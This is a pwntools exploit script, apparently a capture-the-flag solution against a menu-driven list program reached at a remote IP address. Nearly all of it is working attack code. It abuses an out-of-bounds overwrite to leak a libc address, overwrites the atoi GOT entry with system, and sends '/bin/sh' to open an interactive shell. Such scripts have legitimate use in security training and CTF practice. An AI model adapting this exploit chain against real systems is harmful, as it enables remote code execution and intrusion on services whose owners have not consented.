# -*- coding: utf-8 -*-
from pwn import *
# p=process('./main')
p=remote('47.106.172.144',65001)
elf=ELF('./main')
#p=process(['./1'],env={'LD_PRELOAD':'./libc-2.27_64.so'})
# libc=ELF('/glibc/2.23/64/lib/libc-2.23.so')
libc=ELF('./libc.so.6')
context(arch='amd64', os='linux', terminal=['/bin/tmux', 'splitw', '-h'])
context.log_level='debug'
def debug():
 gdb.attach(p)
 pause()
def lg(name,val):
 log.success(name+' : '+hex(val))
def menu(a):
 p.recvuntil('> ')
 p.sendline(str(a))
def add(count):
 menu(1)
 p.recvuntil('List count: ')
 p.sendline(str(count))
def show(idx1,idx2):
 menu(2)
 p.recvuntil('List id: ')
 p.sendline(str(idx1))
 p.recvuntil('Item id: ')
 p.sendline(str(idx2))
def edit(idx1,idx2,idx3):
 menu(3)
 p.recvuntil('List id: ')
 p.sendline(str(idx1))
 p.recvuntil('Item id: ')
 p.sendline(str(idx2))
 p.recvuntil('New number: ')
 p.sendline(str(idx3))
def overwrite(idx1,idx2,idx3,idx4):
 menu(4)
 p.recvuntil('List id: ')
 p.sendline(str(idx1))
 p.recvuntil('Star id: ')
 p.sendline(str(idx2))
 p.recvuntil('End id: ')
 p.sendline(str(idx3))
 p.recvuntil('New number: ')
 p.sendline(str(idx4))
def showall():
 menu(5)
add(1)
overwrite(0,3,3,0x3b1)
add(0x100)
add(1)
overwrite(0,9,10,0x1000000)


show(2,1)
p.recvuntil('Number: ')
a=int(p.recvuntil('\n',drop=True))


libc_address=a-88-0x3c4b10-0x10
lg('libc_address',libc_address)
#gdb.attach(p)
pause()
overwrite(0,8,8,elf.got['atoi'])
print(hex(libc.symbols['system']))
# edit(2,0,libc.symbols['system'])
edit(2,0,libc_address+0x0453a0)
#debug()
menu('/bin/sh\x00')
p.interactive()
